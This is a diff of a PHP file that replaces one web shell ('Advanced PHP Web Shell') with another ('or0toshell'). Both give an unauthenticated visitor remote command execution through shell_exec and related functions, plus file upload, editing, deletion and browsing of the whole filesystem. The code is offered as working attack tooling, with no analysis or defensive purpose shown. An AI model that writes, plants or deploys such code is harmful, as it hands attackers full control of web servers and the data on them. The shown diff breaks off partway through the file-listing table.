@@ -1,503 +1,350 @@
 <?php
 session_start();
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-define('BASE_DIR', realpath(__DIR__));
-if (!isset($_SESSION['cwd'])) { $_SESSION['cwd'] = BASE_DIR; }
-if (!isset($_SESSION['cmd_history'])) { $_SESSION['cmd_history'] = []; }
-function getRealDir($dir) {
-    $real = realpath($dir);
-    if ($real !== false && is_dir($real) && strpos($real, BASE_DIR) === 0) { return $real; }
-    return false;
+$rootPath = __DIR__;
+function formatSizeUnits($bytes) {
+    if ($bytes >= 1073741824) {
+        return number_format($bytes / 1073741824, 2) . ' GB';
+    } elseif ($bytes >= 1048576) {
+        return number_format($bytes / 1048576, 2) . ' MB';
+    } elseif ($bytes >= 1024) {
+        return number_format($bytes / 1024, 2) . ' KB';
+    } elseif ($bytes > 1) {
+        return $bytes . ' bytes';
+    } elseif ($bytes == 1) {
+        return $bytes . ' byte';
+    }
+    return '0 bytes';
 }
-function isWithinBase($path) {
-    $realBase = BASE_DIR;
-    $realPath = realpath($path);
-    if ($realPath === false) return false;
-    return strpos($realPath, $realBase) === 0;
+function fileExtension($file) {
+    return pathinfo($file, PATHINFO_EXTENSION);
 }
-function recordCommand($cmd) { $_SESSION['cmd_history'][] = $cmd; }
-function processCommand($cmd, $cwd) {
-    $cmd = trim($cmd);
-    recordCommand($cmd);
-    $lowerCmd = strtolower($cmd);
-    if ($lowerCmd === 'help') {
-        $help  = "Available Commands:\n";
-        $help .= "help                 - Show this help message\n";
-        $help .= "sysinfo              - Display system information\n";
-        $help .= "pwd                  - Show current directory\n";
-        $help .= "cd [dir]             - Change directory ('..' to go up, '~' for home)\n";
-        $help .= "cat [file]           - Display file contents\n";
-        $help .= "mkdir [dir]          - Create a new directory\n";
-        $help .= "rm [file/dir]        - Delete file or directory (recursive for dirs)\n";
-        $help .= "cp [src] [dest]      - Copy file or directory\n";
-        $help .= "mv [src] [dest]      - Move (rename) file or directory\n";
-        $help .= "chmod [mode] [file]  - Change file permissions (octal mode)\n";
-        $help .= "history              - Show command history\n";
-        $help .= "search [pattern]     - Search for files in current directory\n";
-        $help .= "ls, pwd, whoami, id  - Standard commands\n";
-        return $help;
+function fileIcon($file) {
+    $ext = strtolower(fileExtension($file));
+    $imgExts   = ["apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp"];
+    $audioExts = ["wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc"];
+    if ($file === "error_log") {
+        return '<i class="fa-solid fa-bug"></i>';
+    } elseif ($file === ".htaccess") {
+        return '<i class="fa-solid fa-hammer"></i>';
     }
-    if ($lowerCmd === 'sysinfo') {
-        $info  = php_uname('a') . "\n";
-        $info .= "PHP Version: " . phpversion() . "\n";
-        return $info;
+    if (in_array($ext, ["html", "htm"])) {
+        return '<i class="fa-brands fa-html5"></i>';
+    } elseif (in_array($ext, ["php", "phtml"])) {
+        return '<i class="fa-brands fa-php"></i>';
+    } elseif (in_array($ext, $imgExts)) {
+        return '<i class="fa-regular fa-images"></i>';
+    } elseif ($ext === "css") {
+        return '<i class="fa-brands fa-css3"></i>';
+    } elseif ($ext === "txt") {
+        return '<i class="fa-regular fa-file-lines"></i>';
+    } elseif (in_array($ext, $audioExts)) {
+        return '<i class="fa-solid fa-music"></i>';
+    } elseif ($ext === "py") {
+        return '<i class="fa-brands fa-python"></i>';
+    } elseif ($ext === "js") {
+        return '<i class="fa-brands fa-js"></i>';
     }
-    if ($lowerCmd === 'pwd') { return $cwd; }
-    if (substr($lowerCmd, 0, 3) === 'cd ') {
-        $parts = preg_split('/\s+/', $cmd, 2);
-        if (count($parts) < 2) return "Usage: cd [directory]";
-        $dir = trim($parts[1]);
-        if ($dir === '~') { $dir = BASE_DIR; }
-        elseif ($dir === '..') { $dir = dirname($cwd); }
-        else { if ($dir[0] !== '/' && $dir[0] !== '\\') { $dir = $cwd . DIRECTORY_SEPARATOR . $dir; } }
-        $realDir = getRealDir($dir);
-        if ($realDir === false) { return "Error: Directory not found or access denied."; }
-        $_SESSION['cwd'] = $realDir;
-        return "Changed directory to: " . $realDir;
-    }
-    if ($lowerCmd === 'history') {
-        $output = "Command History:\n";
-        foreach ($_SESSION['cmd_history'] as $i => $c) { $output .= ($i+1) . ". " . $c . "\n"; }
-        return $output;
-    }
-    if (substr($lowerCmd, 0, 7) === 'search ') {
-        $parts = preg_split('/\s+/', $cmd, 2);
-        if (count($parts) < 2) return "Usage: search [pattern]";
-        $pattern = trim($parts[1]);
-        $files = glob($cwd . DIRECTORY_SEPARATOR . $pattern);
-        if (!$files) { return "No matching files found."; }
-        return implode("\n", array_map('basename', $files));
-    }
-    if (substr($lowerCmd, 0, 4) === 'cat ') {
-        $parts = preg_split('/\s+/', $cmd, 2);
-        if (count($parts) < 2) return "Usage: cat [filename]";
-        $filename = trim($parts[1]);
-        if ($filename[0] !== '/' && $filename[0] !== '\\') { $filename = $cwd . DIRECTORY_SEPARATOR . $filename; }
-        if (!isWithinBase($filename)) return "Error: Access denied.";
-        if (is_file($filename) && is_readable($filename)) { return file_get_contents($filename); }
-        else { return "Error: File not found or not readable."; }
-    }
-    if (substr($lowerCmd, 0, 6) === 'mkdir ') {
-        $parts = preg_split('/\s+/', $cmd, 2);
-        if (count($parts) < 2) return "Usage: mkdir [directory]";
-        $dirname = trim($parts[1]);
-        if ($dirname[0] !== '/' && $dirname[0] !== '\\') { $dirname = $cwd . DIRECTORY_SEPARATOR . $dirname; }
-        $parent = dirname($dirname);
-        if (!isWithinBase($parent)) return "Error: Access denied.";
-        return mkdir($dirname, 0777, true) ? "Directory created: " . $dirname : "Error: Failed to create directory.";
-    }
-    if (substr($lowerCmd, 0, 3) === 'rm ') {
-        $parts = preg_split('/\s+/', $cmd, 2);
-        if (count($parts) < 2) return "Usage: rm [file/dir]";
-        $target = trim($parts[1]);
-        if ($target[0] !== '/' && $target[0] !== '\\') { $target = $cwd . DIRECTORY_SEPARATOR . $target; }
-        if (!isWithinBase($target)) return "Error: Access denied.";
-        if (is_file($target)) { return unlink($target) ? "File deleted: " . $target : "Error: Failed to delete file."; }
-        elseif (is_dir($target)) {
-            if (!function_exists('rrmdir')) {
-                function rrmdir($dir) {
-                    $files = array_diff(scandir($dir), ['.', '..']);
-                    foreach ($files as $file) { $path = $dir . DIRECTORY_SEPARATOR . $file; is_dir($path) ? rrmdir($path) : unlink($path); }
-                    return rmdir($dir);
-                }
-            }
-            return rrmdir($target) ? "Directory deleted: " . $target : "Error: Failed to delete directory.";
-        } else { return "Error: Target not found."; }
-    }
-    if (substr($lowerCmd, 0, 3) === 'cp ') {
-        $parts = preg_split('/\s+/', $cmd, 3);
-        if (count($parts) < 3) return "Usage: cp [source] [destination]";
-        $src = trim($parts[1]);
-        $dest = trim($parts[2]);
-        if ($src[0] !== '/' && $src[0] !== '\\') { $src = $cwd . DIRECTORY_SEPARATOR . $src; }
-        if ($dest[0] !== '/' && $dest[0] !== '\\') { $dest = $cwd . DIRECTORY_SEPARATOR . $dest; }
-        if (!isWithinBase($src) || !isWithinBase(dirname($dest))) { return "Error: Access denied."; }
-        if (!file_exists($src)) return "Error: Source not found.";
-        if (is_file($src)) { return copy($src, $dest) ? "File copied to: " . $dest : "Error: Failed to copy file."; }
-        elseif (is_dir($src)) {
-            if (!function_exists('rcopy')) {
-                function rcopy($src, $dst) {
-                    $dir = opendir($src);
-                    @mkdir($dst);
-                    while(false !== ($file = readdir($dir))) {
-                        if ($file != '.' && $file != '..') {
-                            is_dir($src . DIRECTORY_SEPARATOR . $file) ? rcopy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file)
-                            : copy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file);
-                        }
-                    }
-                    closedir($dir);
-                }
-            }
-            rcopy($src, $dest);
-            return "Directory copied to: " . $dest;
-        }
-    }
-    if (substr($lowerCmd, 0, 3) === 'mv ') {
-        $parts = preg_split('/\s+/', $cmd, 3);
-        if (count($parts) < 3) return "Usage: mv [source] [destination]";
-        $src = trim($parts[1]);
-        $dest = trim($parts[2]);
-        if ($src[0] !== '/' && $src[0] !== '\\') { $src = $cwd . DIRECTORY_SEPARATOR . $src; }
-        if ($dest[0] !== '/' && $dest[0] !== '\\') { $dest = $cwd . DIRECTORY_SEPARATOR . $dest; }
-        if (!isWithinBase($src) || !isWithinBase(dirname($dest))) { return "Error: Access denied."; }
-        if (!file_exists($src)) return "Error: Source not found.";
-        return rename($src, $dest) ? "Moved to: " . $dest : "Error: Failed to move.";
-    }
-    if (substr($lowerCmd, 0, 6) === 'chmod ') {
-        $parts = preg_split('/\s+/', $cmd, 3);
-        if (count($parts) < 3) return "Usage: chmod [mode] [file]";
-        $mode = octdec(trim($parts[1]));
-        $target = trim($parts[2]);
-        if ($target[0] !== '/' && $target[0] !== '\\') { $target = $cwd . DIRECTORY_SEPARATOR . $target; }
-        if (!isWithinBase($target)) return "Error: Access denied.";
-        return chmod($target, $mode) ? "Permissions changed for: " . $target : "Error: Failed to change permissions.";
-    }
-    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
-    $output = "";
-    if (function_exists('shell_exec')) {
-        $output = @shell_exec($fullCmd);
-        if ($output !== null && trim($output) !== "") return $output;
-    }
-    if (function_exists('proc_open')) {
-        $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
-        $process = @proc_open($fullCmd, $descriptorspec, $pipes);
-        if (is_resource($process)) {
-            $output = stream_get_contents($pipes[1]);
-            $error  = stream_get_contents($pipes[2]);
-            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
-            proc_close($process);
-            if (trim($output . $error) !== "") return $output . $error;
-        }
-    }
-    if (function_exists('popen')) {
-        $handle = @popen($fullCmd, 'r');
-        if (is_resource($handle)) {
-            $output = stream_get_contents($handle);
-            pclose($handle);
-            if (trim($output) !== "") return $output;
-        }
-    }
-    if (function_exists('exec')) {
-        $outputArr = [];
-        @exec($fullCmd, $outputArr);
-        if (!empty($outputArr)) return implode("\n", $outputArr);
-    }
-    if (function_exists('system')) {
-        ob_start();
-        @system($fullCmd);
-        $output = ob_get_clean();
-        if ($output !== false && trim($output) !== "") return $output;
-    }
-    if (function_exists('passthru')) {
-        ob_start();
-        @passthru($fullCmd);
-        $output = ob_get_clean();
-        if ($output !== false && trim($output) !== "") return $output;
-    }
-    return "Error: No command execution functions available.";
+    return '<i class="fa-solid fa-file"></i>';
 }
-function getFileList($cwd) {
-    $files = scandir($cwd);
-    $files = array_diff($files, ['.', '..']);
-    $list = [];
-    if ($cwd !== BASE_DIR) {
-        $list[] = ['name' => '..', 'type' => 'dir', 'download' => ''];
-    }
-    foreach ($files as $file) {
-        $fullPath = $cwd . DIRECTORY_SEPARATOR . $file;
-        $relative = "";
-        if (is_file($fullPath)) {
-            $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
-            $realFile = realpath($fullPath);
-            if ($docRoot && strpos($realFile, $docRoot) === 0) {
-                $relative = str_replace('\\', '/', substr($realFile, strlen($docRoot)));
-                $relative = ($relative[0]=='/' ? $relative : '/'.$relative);
-            }
-        }
-        $list[] = ['name' => $file, 'type' => is_dir($fullPath) ? 'dir' : 'file', 'download' => $relative];
-    }
-    return $list;
+function encodePath($path) {
+    return urlencode(base64_encode($path));
 }
-if (isset($_GET['action'])) {
-    header('Content-Type: application/json');
-    $action = $_GET['action'];
-    if ($action == 'command') {
-        $cmd = isset($_POST['command']) ? $_POST['command'] : '';
-        $cwd = $_SESSION['cwd'];
-        $output = processCommand($cmd, $cwd);
-        echo json_encode(['output' => $output, 'cwd' => $_SESSION['cwd']]);
+function decodePath($encoded) {
+    return base64_decode(urldecode($encoded));
+}
+function generateBreadcrumb($path) {
+    $path = str_replace('\\', '/', $path);
+    $parts = explode('/', $path);
+    $breadcrumb = '<a href="?p=' . encodePath(DIRECTORY_SEPARATOR) . '">Root</a>';
+    $current = '';
+    foreach ($parts as $part) {
+        if (empty($part)) continue;
+        $current .= DIRECTORY_SEPARATOR . $part;
+        $breadcrumb .= ' / <a href="?p=' . encodePath($current) . '">' . htmlspecialchars($part) . '</a>';
+    }
+    return $breadcrumb;
+}
+$currentPath = $rootPath;
+if (isset($_GET['p'])) {
+    $decoded = decodePath($_GET['p']);
+    if (is_dir($decoded)) {
+        $currentPath = realpath($decoded);
+    } else {
+        $_SESSION['message'] = "Invalid directory.";
+        header("Location: ?p=" . encodePath($rootPath));
         exit;
-    } elseif ($action == 'list') {
-        $cwd = $_SESSION['cwd'];
-        $list = getFileList($cwd);
-        echo json_encode(['files' => $list, 'cwd' => $_SESSION['cwd']]);
+    }
+} elseif (isset($_GET['q'])) {
+    $decoded = decodePath($_GET['q']);
+    if (is_dir($decoded)) {
+        $currentPath = realpath($decoded);
+    } else {
+        header("Location: ?p=" . encodePath($rootPath));
         exit;
-    } elseif ($action == 'upload') {
-        $response = [];
-        $cwd = $_SESSION['cwd'];
-        if (isset($_FILES['uploadFile']) && $_FILES['uploadFile']['error'] === UPLOAD_ERR_OK) {
-            $uploadName = basename($_FILES['uploadFile']['name']);
-            $uploadName = preg_replace('/[^A-Za-z0-9._-]/', '_', $uploadName);
-            $destination = $cwd . DIRECTORY_SEPARATOR . $uploadName;
-            if (!isWithinBase($destination)) {
-                $response['status'] = 'error';
-                $response['message'] = 'Error: Access denied.';
-            } elseif (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $destination)) {
-                $response['status'] = 'success';
-                $response['message'] = 'File uploaded successfully.';
-            } else {
-                $response['status'] = 'error';
-                $response['message'] = 'File upload failed.';
-            }
+    }
+}
+define("CURRENT_PATH", $currentPath);
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['rename']) && isset($_GET['r'])) {
+        $oldItem = CURRENT_PATH . DIRECTORY_SEPARATOR . basename($_GET['r']);
+        $newName = basename($_POST['name']);
+        $newItem = CURRENT_PATH . DIRECTORY_SEPARATOR . $newName;
+        if (rename($oldItem, $newItem)) {
+            $_SESSION['message'] = "Renamed successfully.";
         } else {
-            $response['status'] = 'error';
-            $response['message'] = 'No file uploaded or an error occurred.';
+            $_SESSION['message'] = "Rename failed.";
         }
-        echo json_encode($response);
+        header("Location: ?p=" . encodePath(CURRENT_PATH));
         exit;
     }
+    if (isset($_POST['edit']) && isset($_GET['e'])) {
+        $filePath = CURRENT_PATH . DIRECTORY_SEPARATOR . basename($_GET['e']);
+        if (file_put_contents($filePath, $_POST['data']) !== false) {
+            $_SESSION['message'] = "File saved successfully.";
+        } else {
+            $_SESSION['message'] = "Error saving file.";
+        }
+        header("Location: ?p=" . encodePath(CURRENT_PATH));
+        exit;
+    }
+    if (isset($_POST['upload'])) {
+        if (isset($_FILES['fileToUpload'])) {
+            $targetPath = CURRENT_PATH . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
+            if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetPath)) {
+                $_SESSION['message'] = "File uploaded successfully.";
+            } else {
+                $_SESSION['message'] = "Upload failed.";
+            }
+        }
+        header("Location: ?p=" . encodePath(CURRENT_PATH));
+        exit;
+    }
+    if (isset($_POST['execute_cmd'])) {
+        $cmd = $_POST['cmd'];
+        $output = shell_exec($cmd);
+        $_SESSION['cmd_output'] = $output;
+        header("Location: ?p=" . encodePath(CURRENT_PATH));
+        exit;
+    }
+}
+if (isset($_GET['d'])) {
+    $itemName = basename($_GET['d']);
+    $itemPath = CURRENT_PATH . DIRECTORY_SEPARATOR . $itemName;
+    if (is_file($itemPath)) {
+        if (unlink($itemPath)) {
+            $_SESSION['message'] = "File deleted.";
+        } else {
+            $_SESSION['message'] = "Error deleting file.";
+        }
+    } elseif (is_dir($itemPath)) {
+        if (rmdir($itemPath)) {
+            $_SESSION['message'] = "Directory deleted.";
+        } else {
+            $_SESSION['message'] = "Error deleting directory (ensure it is empty).";
+        }
+    }
+    header("Location: ?p=" . encodePath(CURRENT_PATH));
     exit;
 }
+$folders = [];
+$files = [];
+if (is_readable(CURRENT_PATH)) {
+    $items = scandir(CURRENT_PATH);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $fullPath = CURRENT_PATH . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($fullPath)) {
+            $folders[] = $item;
+        } elseif (is_file($fullPath)) {
+            $files[] = $item;
+        }
+    }
+}
+$system_info = [
+    'Operating System' => php_uname(),
+    'PHP Version'      => phpversion(),
+    'Server Software'  => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
+    'Document Root'    => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
+    'Current Directory'=> CURRENT_PATH,
+    'Free Disk Space'  => formatSizeUnits(disk_free_space(CURRENT_PATH)),
+    'Total Disk Space' => formatSizeUnits(disk_total_space(CURRENT_PATH))
+];
+$message = isset($_SESSION['message']) ? $_SESSION['message'] : '';
+$cmd_output = isset($_SESSION['cmd_output']) ? $_SESSION['cmd_output'] : '';
+unset($_SESSION['message'], $_SESSION['cmd_output']);
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Advanced PHP Web Shell</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
-  <style>
-    body {background: #1d1f21;color: #c5c8c6;font-family: 'Fira Code', monospace;margin-bottom: 60px;}
-    body.light-mode {background: #f8f9fa;color: #212529;}
-    body.light-mode .navbar {background: #ffffff;border-bottom: 1px solid #dee2e6;}
-    body.light-mode .navbar-brand {color: #0d6efd;}
-    body.light-mode .terminal-container {background: #e9ecef;color: #212529;}
-    body.light-mode .file-explorer {background: #f8f9fa;color: #212529;}
-    body.light-mode .input-group-text {background: #ffffff;border: 1px solid #ced4da;color: #212529;}
-    body.light-mode #commandInput {background: #ffffff;border: 1px solid #ced4da;color: #212529;}
-    body.light-mode #sendCommand {background: #0d6efd;color: #ffffff;}
-    body.light-mode #clearTerminal {background: #dc3545;color: #ffffff;}
-    body.light-mode .footer {background: #ffffff;color: #212529;border-top: 1px solid #dee2e6;}
-    .navbar {background: #282a36;border-bottom: 1px solid #444;}
-    .navbar-brand {color: #8be9fd;font-size: 1.75rem;}
-    .navbar .btn {background: #ff5555;color: #f8f8f2;border: none;}
-    .header-banner {text-align: center;margin: 20px 0;font-size: 1rem;color: #50fa7b;}
-    .terminal-container, .file-explorer {border: 1px solid #444;border-radius: 5px;padding: 15px;height: 500px;overflow-y: auto;}
-    .terminal-container {background: #000;}
-    .file-explorer {background: #121212;}
-    .terminal-line {margin-bottom: 5px;line-height: 1.4;}
-    .prompt {color: #50fa7b;}
-    .command-output {color: #c5c8c6;}
-    .file-item {cursor: pointer;color: #bd93f9;}
-    .file-item:hover {text-decoration: underline;}
-    .file-download {color: #f1fa8c;}
-    .input-group-text {background: #282a36;border: 1px solid #444;color: #50fa7b;}
-    #commandInput {background: #282a36;border: 1px solid #444;color: #c5c8c6;}
-    #sendCommand {background: #50fa7b;border: none;color: #282a36;}
-    #clearTerminal {background: #ff5555;border: none;color: #fff;}
-    .fade-in {animation: fadeIn 0.4s ease-in-out;}
-    @keyframes fadeIn {from {opacity: 0;} to {opacity: 1;}}
-    .history-hint {font-size: 0.8rem;color: #8be9fd;margin-top: 5px;}
-    .footer {position: fixed;bottom: 0;width: 100%;background: #282a36;color: #8be9fd;text-align: center;padding: 10px 0;font-size: 0.9rem;border-top: 1px solid #444;}
-    .footer a {color: #50fa7b;text-decoration: none;}
-    .footer a:hover {text-decoration: underline;}
-  </style>
+<meta charset="UTF-8">
+<title>or0toshell</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" rel="stylesheet">
+<style>
+body { background-color: #000; color: #FFD700; }
+.navbar, .card { background-color: #000; border: 1px solid #FFD700; }
+a { color: #FFD700; }
+a:hover { color: #FFA500; text-decoration: none; }
+.breadcrumb a { color: #FFD700; }
+.table { color: #FFD700; }
+.form-control, .btn { background-color: #000; border: 1px solid #FFD700; color: #FFD700; }
+.form-control:focus, .btn:focus { box-shadow: none; }
+pre { background-color: #000; padding: 15px; border: 1px solid #FFD700; border-radius: 5px; overflow-x: auto; color: #FFD700; }
+.footer { text-align: center; margin-top: 20px; font-size: 0.9em; }
+</style>
 </head>
 <body>
-  <nav class="navbar navbar-expand-lg">
-    <div class="container-fluid">
-      <a class="navbar-brand" href="#">Advanced PHP Shell</a>
-      <div class="d-flex">
-        <button id="toggleTheme" class="btn btn-sm me-2" title="Toggle Theme"><i class="bi bi-brightness-high"></i></button>
-        <button id="clearTerminal" class="btn btn-sm me-2" title="Clear Terminal"><i class="bi bi-x-circle"></i></button>
-        <button id="historyBtn" class="btn btn-sm me-2" title="View Command History"><i class="bi bi-clock-history"></i></button>
-        <button id="helpBtn" class="btn btn-sm" title="Help"><i class="bi bi-info-circle"></i></button>
-      </div>
+<div class="container py-3">
+  <nav class="navbar navbar-expand-lg mb-3">
+    <a class="navbar-brand" href="?p=<?= encodePath(CURRENT_PATH) ?>">or0toshell</a>
+    <div class="ms-auto">
+      <a href="?p=<?= encodePath($rootPath) ?>" class="btn btn-sm btn-outline-warning me-2">Home</a>
+      <a href="?p=<?= encodePath(CURRENT_PATH) ?>&upload=1" class="btn btn-sm btn-outline-warning">Upload</a>
     </div>
   </nav>
-  <div class="header-banner">Welcome! Type commands, navigate directories, upload files, and more.</div>
-  <div class="container-fluid mt-3">
-    <div class="row">
-      <div class="col-lg-3 col-md-4 mb-3">
-        <h5 class="mb-3">File Explorer</h5>
-        <div id="fileExplorer" class="file-explorer"></div>
-        <form id="uploadForm" class="mt-3" enctype="multipart/form-data">
-          <div class="mb-2">
-            <label for="uploadFile" class="form-label">Upload File</label>
-            <input type="file" class="form-control form-control-sm" id="uploadFile" name="uploadFile">
+  <?php if ($message): ?>
+    <div class="alert alert-warning"><?= htmlspecialchars($message) ?></div>
+  <?php endif; ?>
+  <div class="card mb-3">
+    <div class="card-header">System Information</div>
+    <div class="card-body">
+      <table class="table table-borderless">
+        <?php foreach ($system_info as $key => $value): ?>
+          <tr>
+            <th><?= htmlspecialchars($key) ?></th>
+            <td><?= htmlspecialchars($value) ?></td>
+          </tr>
+        <?php endforeach; ?>
+      </table>
+    </div>
+  </div>
+  <div class="card mb-3">
+    <div class="card-header">Execute Command</div>
+    <div class="card-body">
+      <form method="post" class="row g-2">
+        <div class="col-md-10">
+          <input type="text" name="cmd" class="form-control" placeholder="Enter shell command" required>
+        </div>
+        <div class="col-md-2">
+          <button type="submit" name="execute_cmd" class="btn btn-warning w-100">Run</button>
+        </div>
+      </form>
+      <?php if ($cmd_output): ?>
+        <hr>
+        <h6>Output:</h6>
+        <pre><?= htmlspecialchars($cmd_output) ?></pre>
+      <?php endif; ?>
+    </div>
+  </div>
+  <nav aria-label="breadcrumb" class="mb-3">
+    <?= generateBreadcrumb(CURRENT_PATH) ?>
+  </nav>
+  <?php if (isset($_GET['upload'])): ?>
+    <div class="card mb-3">
+      <div class="card-header">Upload File</div>
+      <div class="card-body">
+        <form method="post" enctype="multipart/form-data">
+          <div class="mb-3">
+            <label for="fileToUpload" class="form-label">Select file:</label>
+            <input type="file" name="fileToUpload" id="fileToUpload" class="form-control" required>
           </div>
-          <button type="submit" class="btn btn-primary btn-sm"><i class="bi bi-upload"></i> Upload</button>
+          <button type="submit" name="upload" class="btn btn-warning">Upload</button>
         </form>
       </div>
-      <div class="col-lg-9 col-md-8">
-        <h5 class="mb-3">Terminal</h5>
-        <div id="terminal" class="terminal-container"></div>
-        <div class="input-group mt-3">
-          <span class="input-group-text prompt" id="currentDir"><?php echo htmlspecialchars($_SESSION['cwd']); ?></span>
-          <input type="text" id="commandInput" class="form-control" placeholder="msf >" autocomplete="off">
-          <button class="btn" id="sendCommand"><i class="bi bi-play-fill"></i> Send</button>
-        </div>
-        <div class="history-hint">Use Up/Down arrow keys for command history</div>
+    </div>
+  <?php endif; ?>
+  <?php if (isset($_GET['r']) && isset($_GET['q'])): ?>
+    <div class="card mb-3">
+      <div class="card-header">Rename: <?= htmlspecialchars($_GET['r']) ?></div>
+      <div class="card-body">
+        <form method="post">
+          <div class="mb-3">
+            <label for="renameInput" class="form-label">New name:</label>
+            <input type="text" name="name" id="renameInput" class="form-control" value="<?= htmlspecialchars($_GET['r']) ?>" required>
+          </div>
+          <button type="submit" name="rename" class="btn btn-warning">Rename</button>
+        </form>
       </div>
     </div>
-  </div>
-  <footer class="footer">&copy; <?php echo date("Y"); ?> Ali Essam. All rights reserved. | <a href="https://www.linkedin.com/in/dragonked2" target="_blank">Visit my LinkedIn</a> | Advanced PHP Web Shell by Ali Essam.</footer>
-  <div class="modal fade" id="helpModal" tabindex="-1" aria-labelledby="helpModalLabel" aria-hidden="true">
-    <div class="modal-dialog modal-dialog-scrollable modal-lg">
-      <div class="modal-content bg-dark text-light">
-        <div class="modal-header">
-          <h5 class="modal-title" id="helpModalLabel">Help &amp; Available Commands</h5>
-          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
-        </div>
-        <div class="modal-body">
-          <pre>
-help                 - Show this help message
-sysinfo              - Display system information
-pwd                  - Show current directory
-cd [dir]             - Change directory ('..' to go up, '~' for home)
-cat [file]           - Display file contents
-mkdir [dir]          - Create a new directory
-rm [file/dir]        - Delete a file or directory (recursive for dirs)
-cp [src] [dest]      - Copy a file or directory
-mv [src] [dest]      - Move (rename) a file or directory
-chmod [mode] [file]  - Change file permissions (octal mode, e.g., 755)
-history              - Show command history
-search [pattern]     - Search for files in current directory (e.g., search *.php)
-ls, pwd, whoami, id  - Standard commands
-          </pre>
-        </div>
-        <div class="modal-footer">
-          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-        </div>
+  <?php endif; ?>
+  <?php if (isset($_GET['e']) && isset($_GET['q'])): ?>
+    <div class="card mb-3">
+      <div class="card-header">Editing File: <?= htmlspecialchars($_GET['e']) ?></div>
+      <div class="card-body">
+        <form method="post">
+          <div class="mb-3">
+            <textarea name="data" rows="10" class="form-control" required><?= htmlspecialchars(file_get_contents(CURRENT_PATH . DIRECTORY_SEPARATOR . $_GET['e'])) ?></textarea>
+          </div>
+          <button type="submit" name="edit" class="btn btn-warning">Save</button>
+        </form>
       </div>
     </div>
-  </div>
-  <div class="modal fade" id="historyModal" tabindex="-1" aria-labelledby="historyModalLabel" aria-hidden="true">
-    <div class="modal-dialog modal-dialog-scrollable">
-      <div class="modal-content bg-dark text-light">
-        <div class="modal-header">
-          <h5 class="modal-title" id="historyModalLabel">Command History</h5>
-          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
-        </div>
-        <div class="modal-body">
-          <pre id="historyContent">No history yet.</pre>
-        </div>
-        <div class="modal-footer">
-          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-        </div>
-      </div>
+  <?php endif; ?>
+  <div class="card">
+    <div class="card-header">Directory: <?= htmlspecialchars(CURRENT_PATH) ?></div>
+    <div class="card-body p-0">
+      <table class="table table-hover m-0">
+        <thead class="table-dark">
+          <tr>
+            <th>Name</th>
+            <th>Size</th>
+            <th>Modified</th>
+            <th>Perms</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody>
+          <?php foreach ($folders as $folder): ?>
+            <tr>
+              <td>
+                <i class="fa-solid fa-folder"></i>
+                <a href="?p=<?= encodePath(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder) ?>"><?= htmlspecialchars($folder) ?></a>
+              </td>
+              <td>—</td>
+              <td><?= date("F d Y H:i:s", filemtime(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder)) ?></td>
+              <td><?= substr(decoct(fileperms(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder)), -3) ?></td>
+              <td>
+                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&r=<?= urlencode($folder) ?>" title="Rename">
+                  <i class="fa-solid fa-pen-to-square"></i>
+                </a>
+                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&d=<?= urlencode($folder) ?>" title="Delete" onclick="return confirm('Delete this folder?');">
+                  <i class="fa-solid fa-trash"></i>
+                </a>
+              </td>
+            </tr>
+          <?php endforeach; ?>
+          <?php foreach ($files as $file): ?>
+            <tr>
+              <td><?= fileIcon($file) ?> <?= htmlspecialchars($file) ?></td>
+              <td><?= formatSizeUnits(filesize(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)) ?></td>
+              <td><?= date("F d Y H:i:s", filemtime(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)) ?></td>
+              <td><?= substr(decoct(fileperms(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)), -3) ?></td>
+              <td>
+                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&e=<?= urlencode($file) ?>" title="Edit">
+                  <i class="fa-solid fa-file-pen"></i>
+                </a>
+                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&r=<?= urlencode($file) ?>" title="Rename">
+                  <i class="fa-solid fa-pen-to-square"></i>
+                </a>
